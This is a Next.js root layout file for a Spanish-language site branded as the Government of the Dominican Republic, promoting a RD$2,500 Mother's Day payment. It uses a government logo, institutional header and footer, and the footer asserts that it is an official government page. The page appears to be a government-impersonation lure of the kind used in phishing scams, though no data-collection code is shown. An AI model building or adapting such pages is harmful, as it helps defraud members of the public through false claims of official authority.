import type React from "react"
import type { Metadata } from "next"
import { Geist, Geist_Mono } from "next/font/google"
import "./globals.css"
import ClientBody from "./ClientBody"
import Image from "next/image"

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
})

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
})

export const metadata: Metadata = {
  title: "Gobierno de la República Dominicana",
  description: "Entrega especial RD$2,500 por el Día de las Madres",
  icons: {
    icon: "/logo-gobierno.png",
    shortcut: "/logo-gobierno.png",
    apple: "/logo-gobierno.png",
  },
}

export default function RootLayout({
  children,
}: {
  children: React.ReactNode
}) {
  return (
    <html lang="es" className={`${geistSans.variable} ${geistMono.variable}`}>
      <head>
        <link rel="icon" href="/logo-gobierno.png" />
      </head>
      <body className="bg-[#f7f7f7] min-h-screen">
        {/* Encabezado Institucional */}
        <header className="bg-[#003366] text-white py-4 px-2 md:px-8 flex flex-col md:flex-row items-center md:justify-start gap-4 border-b border-gray-200">
          <div className="w-20 h-20 relative">
            <Image
              src="/logo-gobierno.png"
              alt="Logo Gobierno de la República Dominicana"
              fill
              className="object-contain"
              priority
            />
          </div>
          <div>
            <h1 className="text-xl md:text-2xl font-bold tracking-wide">Gobierno de la República Dominicana</h1>
            <span className="block mt-1 text-sm md:text-base font-medium text-white/80">
              Entrega especial RD$2,500 por el Día de las Madres
            </span>
          </div>
        </header>
        {/* Fin Encabezado */}
        <main className="max-w-2xl mx-auto w-full p-4 md:p-8">
          <ClientBody>{children}</ClientBody>
        </main>
        {/* Pie de página */}
        <footer className="bg-[#002244] text-white py-6 px-4 text-center text-sm">
          <p>© {new Date().getFullYear()} Gobierno de la República Dominicana. Todos los derechos reservados.</p>
          <p className="mt-2">
            Esta es una página oficial del Gobierno de la República Dominicana para el programa de entrega especial por
            el Día de las Madres.
          </p>
        </footer>
      </body>
    </html>
  )
}
